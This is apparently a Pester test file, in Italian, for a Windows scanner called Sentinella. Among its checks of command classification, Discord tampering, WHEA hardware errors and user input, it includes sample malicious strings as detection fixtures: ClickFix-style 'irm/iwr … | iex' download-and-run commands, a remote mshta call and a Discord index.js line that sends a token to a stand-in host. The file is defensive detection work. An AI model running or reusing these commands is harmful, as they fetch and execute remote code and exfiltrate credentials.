# =====================================================================
#  Test automatici della logica di giudizio di Sentinella.
#
#  Provano con dati finti che gli allarmi scattino quando devono e
#  tacciano quando non devono, senza bisogno di un PC infetto.
#
#  Scritti per Pester 3.4, la versione inclusa in ogni Windows 10/11:
#  nessuna installazione richiesta.
#     powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-Pester .\test"
# =====================================================================

$radice = Split-Path $PSScriptRoot -Parent
. (Join-Path $radice 'moduli\Base.ps1')
. (Join-Path $radice 'moduli\Analisi.ps1')

Describe 'EstraiEseguibile' {
    It 'toglie virgolette e parametri' {
        EstraiEseguibile '"C:\Program Files\App\app.exe" --background' | Should Be 'C:\Program Files\App\app.exe'
    }
    It 'riconosce un percorso senza virgolette con parametri' {
        EstraiEseguibile 'E:\Programmi\UpdateChecker.exe -a' | Should Be 'E:\Programmi\UpdateChecker.exe'
    }
    It 'espande le variabili di ambiente' {
        EstraiEseguibile '%SystemRoot%\system32\cmd.exe /c x' | Should Be "$env:SystemRoot\system32\cmd.exe"
    }
}

Describe 'EsuPercorsoSospetto' {
    It 'Windows e Programmi non sono sospetti' {
        EsuPercorsoSospetto "$env:SystemRoot\System32\svchost.exe" | Should Be $false
        EsuPercorsoSospetto "$env:ProgramFiles\App\a.exe" | Should Be $false
    }
    It 'la cartella temporanea di Windows invece si' {
        EsuPercorsoSospetto "$env:SystemRoot\Temp\x.exe" | Should Be $true
    }
    It 'profilo utente e altri dischi sono da verificare' {
        EsuPercorsoSospetto "$env:APPDATA\x.exe" | Should Be $true
        EsuPercorsoSospetto 'E:\Programmi\UpdateChecker.exe' | Should Be $true
    }
    It 'un percorso di rete e'' sempre sospetto' {
        EsuPercorsoSospetto '\\server\share\x.exe' | Should Be $true
    }
}

Describe 'ComandoSospetto (avvio, attivita'', servizi)' {
    It 'powershell con codice nascosto' {
        ComandoSospetto 'powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA' | Should Be $true
    }
    It 'mshta da internet' {
        ComandoSospetto 'mshta.exe https://esempio.invalid/x.hta' | Should Be $true
    }
    It 'la pulizia di OneDrive non e'' sospetta' {
        ComandoSospetto 'cmd.exe /q /c del /q "C:\Users\x\AppData\Local\Microsoft\OneDrive\old"' | Should Be $false
    }
    It 'un programma normale non e'' sospetto' {
        ComandoSospetto '"C:\Program Files\Steam\steam.exe" -silent' | Should Be $false
    }
}

Describe 'ComandoIncollatoSospetto (ClickFix)' {
    It 'finto CAPTCHA = grave' {
        $r = ComandoIncollatoSospetto 'powershell -c "iwr x.invalid/a|iex" # I am not a robot - Verification ID: 4821'
        $r.Livello | Should Be 2
    }
    It 'scarica ed esegue in finestra nascosta = grave' {
        (ComandoIncollatoSospetto 'powershell -w hidden -nop -c "irm https://x.invalid/p | iex"').Livello | Should Be 2
    }
    It 'mshta con url = grave' {
        (ComandoIncollatoSospetto 'mshta https://x.invalid/verifica').Livello | Should Be 2
    }
    It 'un installer da riga di comando = da riconoscere, non grave' {
        (ComandoIncollatoSospetto 'irm https://get.scoop.sh | iex').Livello | Should Be 1
    }
    It 'comandi normali non vengono segnalati' {
        ComandoIncollatoSospetto 'ncpa.cpl' | Should Be $null
        ComandoIncollatoSospetto 'netsh wlan show interfaces' | Should Be $null
        ComandoIncollatoSospetto 'Get-Process | Sort-Object CPU' | Should Be $null
        ComandoIncollatoSospetto '%localappdata%\Activision\Call of Duty\Players' | Should Be $null
    }
}

Describe 'EsitoIndexDiscord' {
    It 'file originale = integro' {
        EsitoIndexDiscord "module.exports = require('./core.asar');" | Should Be 'integro'
        EsitoIndexDiscord "module.exports = require(`"./core.asar`");`r`n" | Should Be 'integro'
    }
    It 'codice aggiunto = manomesso' {
        EsitoIndexDiscord "const h=require('https');h.get('https://x.invalid/'+token);module.exports = require('./core.asar');" | Should Be 'manomesso'
    }
    It 'BetterDiscord o Vencord = mod riconosciuta' {
        EsitoIndexDiscord "require('C:/Users/x/AppData/Roaming/BetterDiscord/data/betterdiscord.asar');module.exports = require('./core.asar');" | Should Be 'mod'
    }
}

Describe 'ProgrammaProprietario' {
    $installati = @(
        [pscustomobject]@{ Nome = 'Equalizer APO'; Cartelle = @('E:\Programmi') },
        [pscustomobject]@{ Nome = 'Steam'; Cartelle = @('C:\Program Files (x86)\Steam') }
    )
    It 'cartella giusta + nome prodotto giusto = riconosciuto' {
        $info = [pscustomobject]@{ ProductName = 'Equalizer APO Update Checker'; CompanyName = ''; FileDescription = '' }
        ProgrammaProprietario 'E:\Programmi\UpdateChecker.exe' $installati $info | Should Be 'Equalizer APO'
    }
    It 'cartella giusta ma nome prodotto estraneo = NON riconosciuto' {
        $info = [pscustomobject]@{ ProductName = 'Totally Legit Miner'; CompanyName = ''; FileDescription = '' }
        ProgrammaProprietario 'E:\Programmi\miner.exe' $installati $info | Should Be $null
    }
    It 'nome prodotto giusto ma cartella estranea = NON riconosciuto' {
        $info = [pscustomobject]@{ ProductName = 'Equalizer APO Update Checker'; CompanyName = ''; FileDescription = '' }
        ProgrammaProprietario "$env:TEMP\UpdateChecker.exe" $installati $info | Should Be $null
    }
    It 'file senza dati interni = NON riconosciuto' {
        ProgrammaProprietario 'E:\Programmi\x.exe' $installati $null | Should Be $null
    }
}

Describe 'AnalizzaWhea' {
    $t0 = Get-Date '2026-11-23 00:53:02'
    It 'nessun errore' {
        (AnalizzaWhea @() @() $true).Diagnosi | Should Be 'nessuno'
    }
    It 'core diversi con riavvio (caso reale di questo PC)' {
        $err = @(
            [pscustomobject]@{ Tempo = $t0; ApicId = 11 },
            [pscustomobject]@{ Tempo = $t0.AddDays(-4); ApicId = 2 },
            [pscustomobject]@{ Tempo = $t0.AddDays(-21); ApicId = 11 },
            [pscustomobject]@{ Tempo = $t0.AddDays(-55); ApicId = 15 }
        )
        $riavvii = @($t0.AddSeconds(-5), $t0.AddDays(-4).AddSeconds(-5), $t0.AddDays(-21).AddSeconds(-4), $t0.AddDays(-55).AddSeconds(-3))
        $a = AnalizzaWhea $err $riavvii $true
        $a.Totale | Should Be 4
        $a.ConRiavvio | Should Be 4
        $a.Diagnosi | Should Be 'core-diversi'
        ($a.Core -join ',') | Should Be '1,5,7'
    }
    It 'sempre lo stesso core = core debole o Curve Optimizer' {
        $err = @([pscustomobject]@{ Tempo = $t0; ApicId = 6 }, [pscustomobject]@{ Tempo = $t0.AddDays(-3); ApicId = 7 })
        $a = AnalizzaWhea $err @() $true
        $a.Diagnosi | Should Be 'stesso-core'
        $a.ConRiavvio | Should Be 0
    }
    It 'un riavvio lontano piu'' di 2 minuti non e'' collegato' {
        $a = AnalizzaWhea @([pscustomobject]@{ Tempo = $t0; ApicId = 1 }) @($t0.AddMinutes(-10)) $false
        $a.ConRiavvio | Should Be 0
    }
}

Describe 'OrigineBlocco' {
    It 'codici della scheda video' {
        OrigineBlocco '193' | Should Be 'scheda video'
        OrigineBlocco '0x141' | Should Be 'scheda video'
        OrigineBlocco '117' | Should Be 'scheda video'
    }
    It 'altri codici' {
        OrigineBlocco '124' | Should Be 'errore hardware'
        OrigineBlocco 'abc' | Should Be 'componente di sistema'
    }
}

Describe 'NomePeriferica e SpiegaCodicePeriferica' {
    It 'una periferica senza nome mostra il suo ID invece di uno spazio vuoto' {
        NomePeriferica ([pscustomobject]@{ Name = $null; Description = $null; PNPDeviceID = 'USB\VID_0000&PID_0000\6&2838F1DC&0&1' }) |
            Should Match 'non riconosciuto.*VID_0000'
    }
    It 'il codice 43 viene spiegato' {
        SpiegaCodicePeriferica 43 | Should Match 'cavo, porta o alimentazione'
    }
}

Describe 'ConvertiPercorsoDispositivo' {
    It 'traduce il percorso interno nella lettera del disco' {
        ConvertiPercorsoDispositivo '\Device\HarddiskVolume3\Users\x\Downloads\a.exe' @{ '\Device\HarddiskVolume3' = 'C:' } |
            Should Be 'C:\Users\x\Downloads\a.exe'
    }
    It 'non confonde Volume3 con Volume30' {
        ConvertiPercorsoDispositivo '\Device\HarddiskVolume30\a.exe' @{ '\Device\HarddiskVolume3' = 'C:' } |
            Should Be '\Device\HarddiskVolume30\a.exe'
    }
}

Describe 'InterpretaRisposta (lista unica di fine scansione)' {
    It 'INVIO = decido dopo' { (InterpretaRisposta '' 5).Azione | Should Be 'dopo' }
    It 'T = tutti' {
        $r = InterpretaRisposta 't' 3
        $r.Azione | Should Be 'tutti'
        ($r.Numeri -join ',') | Should Be '1,2,3'
    }
    It 'N = nessuno' { (InterpretaRisposta 'N' 3).Azione | Should Be 'nessuno' }
    It 'numeri, intervalli e doppioni' {
        $r = InterpretaRisposta '1, 3 5-7;3' 20
        $r.Azione | Should Be 'scelti'
        ($r.Numeri -join ',') | Should Be '1,3,5,6,7'
    }
    It 'un numero fuori elenco e'' rifiutato' { InterpretaRisposta '2,9' 5 | Should Be $null }
    It 'lo zero e'' rifiutato' { InterpretaRisposta '0' 5 | Should Be $null }
    It 'un intervallo al contrario e'' rifiutato' { InterpretaRisposta '7-3' 9 | Should Be $null }
    It 'il testo a caso e'' rifiutato' { InterpretaRisposta 'boh' 5 | Should Be $null }
}

Describe 'RitiraReperto (un file riconosciuto esce dal verdetto)' {
    It 'il controllo torna OK e il reperto resta nel dettaglio come nota' {
        $script:silenzioso = $true
        EseguiControllo 'prova ritiro' { Allarme 'file sconosciuto X'; Nota 'altro' }
        $script:esiti['prova ritiro'] | Should Be 2
        $script:allarmi.Contains('file sconosciuto X') | Should Be $true
        RitiraReperto 'prova ritiro' 'file sconosciuto X' 'riconosciuto da te'
        $script:esiti['prova ritiro'] | Should Be 0
        $script:allarmi.Contains('file sconosciuto X') | Should Be $false
        @($script:reperti | Where-Object { $_['controllo'] -eq 'prova ritiro' -and $_['testo'] -like 'file sconosciuto X*riconosciuto da te*' }).Count | Should Be 1
    }
    It 'se resta un altro reperto, il controllo resta al suo livello' {
        EseguiControllo 'prova ritiro 2' { Allarme 'file A'; Attenzione 'file B' }
        RitiraReperto 'prova ritiro 2' 'file A' 'riconosciuto da te'
        $script:esiti['prova ritiro 2'] | Should Be 1
    }
}

Describe 'Motore: regola d''oro (mai OK senza esito)' {
    It 'un controllo che non dice niente risulta NON VERIFICATO' {
        $script:silenzioso = $true
        EseguiControllo 'prova muta' { }
        $script:esiti['prova muta'] | Should Be 4
    }
    It 'un controllo che si interrompe risulta NON VERIFICATO' {
        EseguiControllo 'prova rotta' { throw 'boom' }
        $script:esiti['prova rotta'] | Should Be 4
    }
    It 'un controllo con Ok esplicito risulta OK' {
        EseguiControllo 'prova buona' { Ok 'tutto a posto' }
        $script:esiti['prova buona'] | Should Be 0
    }
    It 'una lettura fallita prevale su un Ok parziale' {
        EseguiControllo 'prova mista' { Ok 'una parte va'; $x = Leggi { throw 'accesso negato' } 'altra parte' }
        $script:esiti['prova mista'] | Should Be 4
        $script:incompleti['prova mista'] | Should Be $true
    }
    It 'un reperto vero prevale su NON VERIFICATO' {
        EseguiControllo 'prova grave' { NonVerificato 'parte illeggibile'; Allarme 'trovato qualcosa' }
        $script:esiti['prova grave'] | Should Be 2
    }
    It 'Leggi distingue "vuoto" da "fallito"' {
        $vuoto = Leggi { @() } 'vuoto'
        $null -eq $vuoto | Should Be $false
        $vuoto.Count | Should Be 0
        $fallito = Leggi { Get-Item 'HKLM:\Non\Esiste\Davvero' } 'fallito'
        $null -eq $fallito | Should Be $true
    }
}
